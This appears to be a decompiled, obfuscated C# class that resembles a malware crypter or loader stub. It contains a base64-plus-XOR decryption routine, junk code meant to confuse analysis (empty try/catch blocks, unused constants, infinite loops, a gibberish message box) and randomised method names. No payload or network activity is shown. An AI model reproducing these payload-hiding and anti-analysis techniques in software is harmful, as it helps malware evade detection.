using System;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace RW;

public class Po
{
	public static string licate = Application.get_ExecutablePath();

	private void method_0()
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		new decimal(278280L);
		MessageBox.Show("h„ƒ…]3$n2 RBo~NY:YŠOZB!8d=XfLq");
		new decimal(16044L);
		new decimal(1628216L);
		while (true)
		{
		}
	}

	public static byte[] O(string File, string key, int amount)
	{
		byte[] array = Convert.FromBase64String(File);
		byte[] bytes = Encoding.Default.GetBytes(key);
		checked
		{
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				array[i] = (byte)(array[i] ^ (unchecked((byte)(bytes[i % bytes.Length] << (checked(i + amount + bytes.Length) & 7))) & 0xFF));
			}
			return array;
		}
	}

	public void Gr0wlit_Sm87iGauLrXr12Hn()
	{
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		while (true)
		{
		}
	}

	public void Gr0wlit_OTp36n8cHhdX9Wnm33()
	{
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			new decimal(-1679134625L);
			ProjectData.ClearProjectError();
		}
		new decimal(-263355956L);
		try
		{
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		while (true)
		{
		}
	}
}
